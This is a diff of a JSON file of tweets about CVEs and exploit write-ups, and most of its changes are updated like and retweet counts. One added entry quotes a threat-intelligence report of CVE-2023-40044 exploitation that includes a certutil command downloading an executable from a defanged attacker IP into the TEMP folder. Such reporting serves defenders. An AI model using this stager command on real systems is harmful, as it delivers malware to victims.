@@ -78,17 +78,17 @@
         "https://www.praetorian.com/blog/refresh-compromising-f5-big-ip-with-request-smuggling-cve-2023-46747/",
         "https://my.f5.com/manage/s/article/K000137353"
     ],
-    "tweetfavorites": 528,
+    "tweetfavorites": 521,
     "tweetquotes": 7,
     "tweetreplies": 4,
-    "tweetretweets": 177,
+    "tweetretweets": 176,
     "tweettext": "Scan for F5 BIG-IP - Unauthenticated RCE via AJP Smuggling (CVE-2023-46747) using nuclei templates shared by  @iamnoooob @rootxharsh \n\nTemplate - https://t.co/rRWXJTXS55\n\nAnalysis - https://t.co/F9Z7VKdL7j by @praetorianlabs\n\nAdvisory - https://t.co/5Rqei12XBR… https://t.co/fKE1dxU8ps",
     "tweettime": "2023-10-29, 19:11:08",
     "tweeturl": "https://twitter.com/pdnuclei/status/1718707055308005468",
     "username": "pdnuclei"
 }
 {
-    "tweetfavorites": 309,
+    "tweetfavorites": 308,
     "tweetquotes": 2,
     "tweetreplies": 4,
     "tweetretweets": 57,
@@ -194,7 +194,7 @@
     "expanded_url": [
         "https://www.synacktiv.com/en/publications/old-bug-shallow-bug-exploiting-ubuntu-at-pwn2own-vancouver-2023"
     ],
-    "tweetfavorites": 268,
+    "tweetfavorites": 261,
     "tweetquotes": 2,
     "tweetreplies": 0,
     "tweetretweets": 84,
@@ -217,10 +217,10 @@
     "expanded_url": [
         "https://n1k0la-t.github.io/2023/10/24/Microsoft-Exchange-Server-CVE-2023-36745/"
     ],
-    "tweetfavorites": 242,
+    "tweetfavorites": 235,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 79,
+    "tweetretweets": 78,
     "tweettext": "CVE-2023-36745:  Microsoft Exchange Server Remote Code Execution Vulnerability.\n\nPoC\nhttps://t.co/t7kkChV08Z https://t.co/UFUmuYBOy7",
     "tweettime": "2023-10-25, 07:12:11",
     "tweeturl": "https://twitter.com/cyber_advising/status/1717076572539117655",
@@ -253,10 +253,10 @@
     "expanded_url": [
         "https://blog.exodusintel.com/2022/12/19/linux-kernel-exploiting-a-netfilter-use-after-free-in-kmalloc-cg/"
     ],
-    "tweetfavorites": 247,
+    "tweetfavorites": 233,
     "tweetquotes": 0,
     "tweetreplies": 1,
-    "tweetretweets": 65,
+    "tweetretweets": 61,
     "tweettext": "Linux kernel exploitation writeup by @ExodusIntel\nCVE-2022-32250 : use-after-free targeting Linux kernel 5.18.1 \n\nhttps://t.co/W6U8j5bZtq\n\n#Linux #kernel #exploit #cve #infosec #cybersecurity https://t.co/b1osYO4V6O",
     "tweettime": "2023-10-24, 16:30:15",
     "tweeturl": "https://twitter.com/0xor0ne/status/1716854626899702179",
@@ -292,10 +292,10 @@
     "expanded_url": [
         "https://securityonline.info/microsoft-exchange-server-rce-cve-2023-36745-flaw-gets-poc-exploit/"
     ],
-    "tweetfavorites": 44,
+    "tweetfavorites": 41,
     "tweetquotes": 0,
     "tweetreplies": 2,
-    "tweetretweets": 10,
+    "tweetretweets": 9,
     "tweettext": "Microsoft Exchange Server RCE (CVE-2023-36745) Flaw Gets PoC Exploit\nhttps://t.co/ZCdYTfc0Ma\n#infosec #security #pentesting https://t.co/aEH8hG0FgV",
     "tweettime": "2023-10-24, 07:45:31",
     "tweeturl": "https://twitter.com/the_yellow_fall/status/1716722572619030814",
@@ -335,11 +335,11 @@
     "username": "cyber_advising"
 }
 {
-    "tweetfavorites": 51,
+    "tweetfavorites": 46,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 12,
-    "tweettext": "CVE-2023-34051\n\nCVE-2023-34051 is an authentication bypass that bypasses the patch for VMSA-2023-0001. VMSA-2023-0001 for vRealize Log Insight includes the following CVEs:\n\n• VMware vRealize Log Insight Directory Traversal Vulnerability (CVE-2022-31706)\n• VMware vRealize Log… https://t.co/baY4M7eUGI",
+    "tweetretweets": 10,
+    "tweettext": "CVE-2023-34051\n\nCVE-2023-34051 is an authentication bypass that bypasses the patch for VMSA-2023-0001. VMSA-2023-0001 for vRealize Log Insight includes the following CVEs:\n\n• VMware vRealize Log Insight Directory Traversal Vulnerability (CVE-2022-31706)\n• VMware vRealize Log https://t.co/baY4M7eUGI",
     "tweettime": "2023-10-21, 07:05:02",
     "tweeturl": "https://twitter.com/hack_git/status/1715625220621373598",
     "username": "hack_git"
@@ -387,10 +387,10 @@
     "expanded_url": [
         "https://forescout.com/resources/l1-lateral-movement-report"
     ],
-    "tweetfavorites": 236,
+    "tweetfavorites": 227,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 74,
+    "tweetretweets": 72,
     "tweettext": "Remote code execution and authentication bypass on Schneider Electric Modicon PLCs (CVE-2022-45788 and CVE-2022-45789)\nExcellent research white paper by @Forescout\n\nhttps://t.co/vXD6kDyTK8\n\n#cybersecurity #plc https://t.co/sasBwI9TTN",
     "tweettime": "2023-10-19, 07:00:15",
     "tweeturl": "https://twitter.com/0xor0ne/status/1714899244149059774",
@@ -437,10 +437,10 @@
         "https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-26369.html",
         "https://blog.google/threat-analysis-group/active-north-korean-campaign-targeting-security-researchers/"
     ],
-    "tweetfavorites": 235,
+    "tweetfavorites": 224,
     "tweetquotes": 2,
-    "tweetreplies": 3,
-    "tweetretweets": 103,
+    "tweetreplies": 4,
+    "tweetretweets": 97,
     "tweettext": "#Lazarus CVE-2023-26369 Exploit: Adobe Acrobat PDF Reader RCE when processing TTF fonts\nhttps://t.co/cQWuyR6fHg\nref:\nhttps://t.co/mwQUWkk8QG https://t.co/S8gU4Q9Pku",
     "tweettime": "2023-10-18, 03:27:26",
     "tweeturl": "https://twitter.com/blackorbird/status/1714483299765354777",
@@ -490,7 +490,7 @@
     "expanded_url": [
         "https://github.blog/2023-10-17-getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler/"
     ],
-    "tweetfavorites": 68,
+    "tweetfavorites": 67,
     "tweetquotes": 0,
     "tweetreplies": 0,
     "tweetretweets": 16,
@@ -531,7 +531,7 @@
     "expanded_url": [
         "https://big5-sec.github.io/posts/CVE-2023-29360-analysis/"
     ],
-    "tweetfavorites": 159,
+    "tweetfavorites": 154,
     "tweetquotes": 0,
     "tweetreplies": 0,
     "tweetretweets": 44,
@@ -555,17 +555,17 @@
     "username": "HunterMapping"
 }
 {
-    "tweetfavorites": 71,
+    "tweetfavorites": 66,
     "tweetquotes": 0,
-    "tweetreplies": 4,
-    "tweetretweets": 12,
+    "tweetreplies": 3,
+    "tweetretweets": 11,
     "tweettext": "CVE-2023-38545: A heap buffer overflow vulnerability in cURL, which gained attention due to an early patch exposure.\nExploitation requires certain conditions, like the use of SOCKS proxies and certain redirect settings.\nThis cannot be used to convert SSRF into RCE.\n#infosec https://t.co/XxEQV9X9Gj",
     "tweettime": "2023-10-12, 09:22:09",
     "tweeturl": "https://twitter.com/win3zz/status/1712398236441550870",
     "username": "win3zz"
 }
 {
-    "tweetfavorites": 185,
+    "tweetfavorites": 184,
     "tweetquotes": 1,
     "tweetreplies": 3,
     "tweetretweets": 56,
@@ -660,10 +660,10 @@
     "username": "KevTheHermit"
 }
 {
-    "tweetfavorites": 633,
-    "tweetquotes": 6,
-    "tweetreplies": 8,
-    "tweetretweets": 171,
+    "tweetfavorites": 597,
+    "tweetquotes": 3,
+    "tweetreplies": 7,
+    "tweetretweets": 166,
     "tweettext": "⚠️ We have reproduced CVE-2023-22515 in Atlassian Confluence.\n\nBroken access control allows unauthenticated users to gain administrative access to the web application! \n\nUpdate your software ASAP! https://t.co/MlE4ygyf3E",
     "tweettime": "2023-10-10, 11:05:51",
     "tweeturl": "https://twitter.com/ptswarm/status/1711699559359865200",
@@ -716,10 +716,10 @@
     "username": "GHSecurityLab"
 }
 {
-    "tweetfavorites": 390,
-    "tweetquotes": 8,
-    "tweetreplies": 10,
-    "tweetretweets": 112,
+    "tweetfavorites": 381,
+    "tweetquotes": 7,
+    "tweetreplies": 8,
+    "tweetretweets": 108,
     "tweettext": "Video of my PoC for CVE-2023-43641: out-of-bounds array access in libcue. libcue is used by tracker-miners, which automatically scans new files in ~/Downloads, so the bug is triggered by downloading a file. https://t.co/xCSkaHD7zp",
     "tweettime": "2023-10-09, 17:02:01",
     "tweeturl": "https://twitter.com/kevin_backhouse/status/1711426803997217020",
@@ -742,7 +742,7 @@
     "expanded_url": [
         "https://wildptr.io/winrar-cve-2023-40477-poc-new-vulnerability-winrar-security-research/"
     ],
-    "tweetfavorites": 87,
+    "tweetfavorites": 88,
     "tweetquotes": 0,
     "tweetreplies": 1,
     "tweetretweets": 41,
@@ -766,12 +766,25 @@
 }
 {
     "expanded_url": [
+        "https://www.reddit.com/r/msp/comments/16y3962/observed_exploitation_of_critical_ws_ftp/"
+    ],
+    "tweetfavorites": 530,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 144,
+    "tweettext": "Small stuff but we are also seeing exploitation of CVE-2023-40044. PowerShell &amp; certutil stagers\n\ncertutil -urlcache -f http[:]//103[.]163.187.12:8080/cz3eKnhcaD0Fik7Eexo66A C:\\WINDOWS\\TEMP\\zpvmRqTOsP.exe\n\nAll downloads in %TEMP% same length filename exe\n\nhttps://t.co/uo4sClL4WK https://t.co/mSJRi8qFZ9",
+    "tweettime": "2023-10-02, 18:22:11",
+    "tweeturl": "https://twitter.com/_JohnHammond/status/1708910264261980634",
+    "username": "_JohnHammond"
+}
+{
+    "expanded_url": [
         "https://github.com/win3zz/CVE-2023-43261"
     ],
-    "tweetfavorites": 298,
-    "tweetquotes": 1,
-    "tweetreplies": 2,
-    "tweetretweets": 101,
+    "tweetfavorites": 292,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 102,
     "tweettext": "CVE-2023-43261 - PoC\nCredential Leakage Through Unprotected System Logs and Weak Password Encryption\n\nPoC: https://t.co/2pw9hzOtTt https://t.co/GMMMMx0YtR",
     "tweettime": "2023-10-01, 17:04:15",
     "tweeturl": "https://twitter.com/win3zz/status/1708528262853677174",
